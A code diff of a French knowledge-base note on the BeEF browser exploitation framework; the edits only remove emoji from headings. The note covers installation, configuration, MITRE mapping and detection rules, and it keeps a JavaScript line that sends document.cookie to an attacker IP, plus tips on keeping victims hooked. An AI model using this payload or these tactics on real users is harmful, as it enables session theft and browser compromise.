@@ -1,7 +1,7 @@
 ---
 title: "Outil - BeEF"
 type: outil
-categorie: 🎭 Social Engineering & Phishing
+categorie: Social Engineering & Phishing
 tags:
   - cyber
   - outil
@@ -16,20 +16,20 @@ site: https://beefproject.com
 doc: https://github.com/beefproject/beef/wiki
 ---
 
-# 🕷️ BeEF (Browser Exploitation Framework) — Le post-exploitation via le navigateur
+# BeEF (Browser Exploitation Framework) — Le post-exploitation via le navigateur
 
 > [!info] **En 1 phrase**
 > BeEF est un framework de test d'intrusion qui transforme le navigateur d'une victime en point d'ancrage d'attaque en injectant une "hook" JavaScript, permettant de lancer des modules d'exploitation, d'exfiltrer des données et de pivoter vers le réseau interne.
 
 ---
 
-## 🧾 Overview
+## Overview
 
 | Champ | Valeur |
 |---|---|
 | Nom complet | BeEF (Browser Exploitation Framework) |
 | Description | Framework de post-exploitation orienté navigateur : injection d'une hook JavaScript, modules d'exploitation navigateur, exfiltration, pivoting réseau |
-| Catégorie | 🎭 Social Engineering & Phishing |
+| Catégorie | Social Engineering & Phishing |
 | Sous-catégorie | Exploitation navigateur / Drive-by |
 | Type d'outil | Framework (serveur + interface web + REST API) |
 | Licence | BSD-3-Clause |
@@ -48,7 +48,7 @@ doc: https://github.com/beefproject/beef/wiki
 
 ---
 
-## 🎯 Concept
+## Concept
 
 BeEF ne s'attaque pas à la machine mais au **navigateur** : plutôt que de chercher à exploiter le système d'exploitation, il transforme le navigateur de la victime en point d'ancrage. Le principe repose sur la **hook** : une charge JavaScript (`hook.js`) chargée depuis le serveur BeEF. Dès qu'une victime ouvre une page qui l'inclut (page clonée, mail de phishing, XSS, publicité malveillante), son navigateur initie une connexion persistante — par polling HTTP ou **WebSocket** — vers le serveur de contrôle BeEF (port 3000). Le navigateur est alors dit *hooked* et apparaît dans le panneau d'administration `/ui/panel`.
 
@@ -66,7 +66,7 @@ flowchart LR
 
 ---
 
-## 🧠 Concepts fondamentaux
+## Concepts fondamentaux
 
 | Concept | Explication |
 |---|---|
@@ -81,7 +81,7 @@ flowchart LR
 
 ---
 
-## 🛠️ Installation
+## Installation
 
 ### Kali Linux / Debian / Ubuntu
 
@@ -116,14 +116,14 @@ bundle install
 docker run -it -p 3000:3000 -p 6789:6789 -p 61985:61985 -p 61986:61986 beefproject/beef:0.6.0.0
 ```
 
-> [!warning] ⚠️ Prérequis & problèmes potentiels
+> [!warning] Prérequis & problèmes potentiels
 > - Ruby ≥ 3.0 et Node.js sont obligatoires depuis la refonte de l'interface ; les anciens paquets Kali peuvent référencer une version obsolète.
 > - Les ports 3000 (interface/hook), 6789 (WebSocket démonstration) et 61985/61986 (agents réseau) doivent être libres.
 > - Le compte admin par défaut `beef:beef` doit être changé immédiatement dans `config.yaml`.
 
 ---
 
-## ⚙️ Configuration
+## Configuration
 
 Toute la configuration se fait dans le fichier **`config.yaml`** à la racine du dépôt (démarrage `./beef`). Les paramètres sont regroupés par section `beef:`, `extension:`, `database:`, `http_server:` et `client:`. Pour un démarrage non interactif, utiliser `./beef --non-interactive`.
 
@@ -163,7 +163,7 @@ beef:
 
 ---
 
-## 🏗️ Architecture interne
+## Architecture interne
 
 BeEF est construit en **Ruby** (côté serveur) et **JavaScript** (côté client et interface). À l'exécution :
 
@@ -177,7 +177,7 @@ Flux d'une attaque type : la page piégée charge `hook.js` → le navigateur en
 
 ---
 
-## ⌨️ Commandes
+## Commandes
 
 ### Commandes principales
 
@@ -233,7 +233,7 @@ sudo ./beef -p 3001 --non-interactive
 
 ---
 
-## 🎚️ Options et flags
+## Options et flags
 
 | Option | Description | Exemple | Niveau |
 |---|---|---|---|
@@ -254,7 +254,7 @@ sudo ./beef -p 3001 --non-interactive
 
 ---
 
-## 🧪 Exemples pratiques
+## Exemples pratiques
 
 ### Beginner
 
@@ -295,7 +295,7 @@ curl -s -H "Content-Type: application/json" -H "X-XSRF-TOKEN: $TOKEN" \
 
 ---
 
-## 🧪 Workflow complet (scénario pas à pas)
+## Workflow complet (scénario pas à pas)
 
 1. **Étape 1 — Lancer BeEF et ouvrir le panel.**
    ```bash
@@ -310,7 +310,7 @@ curl -s -H "Content-Type: application/json" -H "X-XSRF-TOKEN: $TOKEN" \
 
 ---
 
-## 🎬 Scénarios avancés
+## Scénarios avancés
 
 ### Scénario 1 : Exfiltration de cookies et de session
 
@@ -345,7 +345,7 @@ new Image().src = 'http://10.10.20.15:4444/?c=' + document.cookie;
 
 ---
 
-## 🛡️ Cybersecurity use cases
+## Cybersecurity use cases
 
 | Phase | Utilisation |
 |---|---|
@@ -359,7 +359,7 @@ new Image().src = 'http://10.10.20.15:4444/?c=' + document.cookie;
 
 ---
 
-## 🎯 MITRE ATT&CK
+## MITRE ATT&CK
 
 | Tactique | Technique / Sub-technique | ID | Raison | Détection | Mitigation |
 |---|---|---|---|---|---|
@@ -374,7 +374,7 @@ new Image().src = 'http://10.10.20.15:4444/?c=' + document.cookie;
 
 ---
 
-## 🛡️ Defensive Security
+## Defensive Security
 
 ### Signes observables
 
@@ -419,7 +419,7 @@ alert http any any -> any any (msg:"ET BeEF hook heartbeat"; flow:to_server,esta
 
 ---
 
-## 🤖 Automatisation
+## Automatisation
 
 ```bash
 # Bash — pipeline complet : lancer BeEF, attendre des zombies, dump des hooks
@@ -449,7 +449,7 @@ for sid in hooks.get("online", {}):
 
 ---
 
-## 📤 Output et parsing
+## Output et parsing
 
 BeEF expose tout par sa **REST API** (JSON) : `hooks`, `sessions`, `modules`, `commands`. La sortie des modules apparaît aussi dans la console du panneau et peut être rapatriée via `/api/modules/{id}/results`.
 
@@ -464,9 +464,9 @@ curl -s -H "X-XSRF-TOKEN: $TOKEN" -b "beefhook=$TOKEN" http://localhost:3000/api
 
 ---
 
-## 🔗 Intégrations
+## Intégrations
 
-- [[Tools|🧰 Outils]] global
+- [[Tools| Outils]] global
 - [[Outil - SET]] — génération de la page / du payload qui sert la hook
 - [[Outil - GoPhish]] — campagne de phishing dont la landing page charge `hook.js`
 - [[Outil - Evilginx2]] — proxy AiTM pouvant servir la hook après capture de session
@@ -482,7 +482,7 @@ SET/GoPhish → lien phish → victime → BeEF panel → session volée
 
 ---
 
-## 🔄 Alternatives
+## Alternatives
 
 | Outil | Avantages | Inconvénients | Cas d'usage |
 |---|---|---|---|
@@ -496,7 +496,7 @@ SET/GoPhish → lien phish → victime → BeEF panel → session volée
 
 ---
 
-## ⚡ Performance
+## Performance
 
 - BeEF est léger pour de petits volumes : un serveur de lab gère des dizaines de zombies sans charge notable.
 - Le coût principal est la **bande passante des heartbeats** : en polling HTTP, chaque zombie génère une requête toutes les ~5 s par défaut ; passer à WebSocket réduit fortement le volume.
@@ -508,7 +508,7 @@ SET/GoPhish → lien phish → victime → BeEF panel → session volée
 
 ---
 
-## 🛠️ Troubleshooting
+## Troubleshooting
 
 ### Common problems
 
@@ -532,7 +532,7 @@ SET/GoPhish → lien phish → victime → BeEF panel → session volée
 
 ---
 
-## 🔐 Sécurité de l'outil
+## Sécurité de l'outil
 
 - **Identifiants par défaut** : `beef:beef` doit être remplacé dans `config.yaml`, sinon le panneau est trivialement prenable.
 - **Exposition réseau** : le panel et la REST API ne doivent **jamais** être exposés sur Internet ; les restreindre au réseau d'engagement.
@@ -543,7 +543,7 @@ SET/GoPhish → lien phish → victime → BeEF panel → session volée
 
 ---
 
-## ⚠️ Limitations
+## Limitations
 
 - Modules d'exploitation limités aux navigateurs/versions vulnérables : la plupart échouent sur un navigateur à jour.
 - La session est perdue dès que la victime ferme l'onglet (pas de persistance machine).
@@ -554,7 +554,7 @@ SET/GoPhish → lien phish → victime → BeEF panel → session volée
 
 ---
 
-## 📋 Cheatsheet
+## Cheatsheet
 
 ```bash
 # Démarrer en mode service
@@ -581,7 +581,7 @@ curl -s -H "X-XSRF-TOKEN: $TOKEN" -b "beefhook=$TOKEN" http://localhost:3000/api
 
 ---
 
-## ⚡ Quick reference
+## Quick reference
 
 | | |
 |---|---|
@@ -594,7 +594,7 @@ curl -s -H "X-XSRF-TOKEN: $TOKEN" -b "beefhook=$TOKEN" http://localhost:3000/api
 
 ---
 
-## 🔍 Détection & Défense
+## Détection & Défense
 
 | Signe | Défense |
 |---|---|
@@ -607,15 +607,15 @@ curl -s -H "X-XSRF-TOKEN: $TOKEN" -b "beefhook=$TOKEN" http://localhost:3000/api
 
 ---
 
-## ⚠️ Tips & Pièges
+## Tips & Pièges
 
-> [!tip] 💡 **Tips**
+> [!tip] **Tips**
 > - Un navigateur **reste hooked** tant que l'onglet ou la page est ouvert : gardez une page de garde ouverte pour maximiser la fenêtre d'attaque.
 > - Utilisez les modules **Reconnaissance** pour récupérer adresse IP, géolocalisation (si autorisée) et présence de plugins vulnérables avant de choisir un exploit.
 > - Couplez BeEF avec un proxy (mitmproxy) ou une page clonée (SET) pour hooker plus de victimes en une campagne.
 > - Activez WebSocket dans `config.yaml` : les heartbeats sont moins voyants que le polling HTTP.
 
-> [!warning] ⚠️ **Pièges**
+> [!warning] **Pièges**
 > - Les modules d'exploitation ne fonctionnent que sur des navigateurs/versions vulnérables : tester dans un lab à jour avant une campagne.
 > - L'interface par défaut `admin/beef` doit être **changée** (fichier `config.yaml`) sinon elle est trivialement exploitable.
 > - Sans autorisation caméra/micro (permission du navigateur), les modules de capture échouent silencieusement.
@@ -623,7 +623,7 @@ curl -s -H "X-XSRF-TOKEN: $TOKEN" -b "beefhook=$TOKEN" http://localhost:3000/api
 
 ---
 
-## 📚 References
+## References
 
 ### Official
 
@@ -647,4 +647,4 @@ curl -s -H "X-XSRF-TOKEN: $TOKEN" -b "beefhook=$TOKEN" http://localhost:3000/api
 
 ---
 
-➡️ **Liens :** [[Tools|🧰 Outils]] · [[Outil - SET|SET]] · [[Outil - Evilginx2|Evilginx2]] · [[Outil - GoPhish|GoPhish]] · [[Outil - SocialFish|SocialFish]] · [[Outil - Metasploit|Metasploit]]
+**Liens :** [[Tools| Outils]] · [[Outil - SET|SET]] · [[Outil - Evilginx2|Evilginx2]] · [[Outil - GoPhish|GoPhish]] · [[Outil - SocialFish|SocialFish]] · [[Outil - Metasploit|Metasploit]]
